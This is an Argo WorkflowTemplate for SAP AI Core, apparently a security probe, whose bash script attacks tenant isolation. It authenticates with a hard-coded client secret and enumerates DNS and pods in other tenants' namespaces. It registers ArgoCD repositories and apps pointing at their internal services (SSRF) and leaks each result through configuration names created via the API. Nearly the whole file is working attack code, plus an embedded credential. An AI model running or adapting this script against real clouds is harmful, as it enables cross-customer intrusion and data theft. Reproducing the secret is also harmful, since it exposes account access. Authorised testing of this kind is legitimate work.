apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "50.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V50: Cross-tenant network access test + ArgoCD SSRF to tenant services
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v50-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        # Pick 5 other tenant RG namespaces to probe
        TARGETS="rg-765c091a-cd927cab rg-a70b5e11-cd927cab rg-4b258265-cd927cab rg-00909d9a-cd927cab rg-ee1f1ccd-cd927cab"

        # 1. DNS enumeration of services in other tenant namespaces
        echo "=== CROSS-TENANT DNS ===" >&2
        for rg in $TARGETS; do
          # Common SAP AI Core service names
          FOUND=""
          for svc in api-server inference-server serving model-server deployment-server argo-server default; do
            ip=$(dig +short "${svc}.${rg}.svc.cluster.local" 2>/dev/null | head -1)
            if [ -n "$ip" ]; then
              FOUND="${FOUND}${svc}=${ip}."
            fi
          done
          # Also try SRV wildcard
          SRV=$(dig +short SRV "*.${rg}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
          save "dns-${rg}-${FOUND:-none}-srv-${SRV:-empty}"
        done

        # 2. Direct TCP connectivity test to other tenant pods (if IPs found)
        echo "=== CROSS-TENANT TCP ===" >&2
        for rg in $TARGETS; do
          # Try connecting to the default service endpoint
          R=$(curl -sk --connect-timeout 3 "http://default.${rg}.svc.cluster.local/" 2>&1 | head -c 150)
          save "tcp-${rg}-default-$(echo $R | head -c 100)"

          # Try port 8080 (common serving port)
          R=$(curl -sk --connect-timeout 3 "http://${rg}.svc.cluster.local:8080/" 2>&1 | head -c 100)
          save "tcp-${rg}-8080-$(echo $R | head -c 80)"
        done

        # 3. ArgoCD SSRF to specific tenant service
        echo "=== ARGOCD TENANT SSRF ===" >&2
        # Register repo pointing to another tenant's namespace
        for rg in rg-765c091a-cd927cab rg-a70b5e11-cd927cab; do
          REPO_NAME="xt-${rg}"
          REPO_URL="http://default.${rg}.svc.cluster.local/test"

          RR=$(curl -sk -X POST "${API}/v2/admin/repositories" \
            -H "Authorization: Bearer $JWT" \
            -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${REPO_NAME}\",\"url\":\"${REPO_URL}\",\"username\":\"x\",\"password\":\"x\"}" 2>/dev/null)
          save "argocd-repo-${rg}-$(echo $RR | head -c 80)"

          # Create app
          AR=$(curl -sk -X POST "${API}/v2/admin/applications" \
            -H "Authorization: Bearer $JWT" \
            -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"applicationName\":\"xt-${rg}-app\",\"repositoryUrl\":\"${REPO_URL}\",\"revision\":\"HEAD\",\"path\":\".\"}" 2>/dev/null)
          save "argocd-app-${rg}-$(echo $AR | head -c 80)"
        done

        # 4. Check our own namespace DNS to understand the naming pattern
        echo "=== OUR NS ===" >&2
        OUR_RG="rg-3ba0e0a4-cd927cab"
        OWN_SVCS=""
        for svc in $(dig +short SRV "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | awk '{print $4}' | head -5); do
          OWN_SVCS="${OWN_SVCS}${svc}."
        done
        save "own-svcs-${OWN_SVCS:-none}"

        # Check what IPs are in our namespace
        OWN_PODS=$(dig +short A "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
        save "own-pods-${OWN_PODS:-none}"

        echo "V50 DONE" >&2
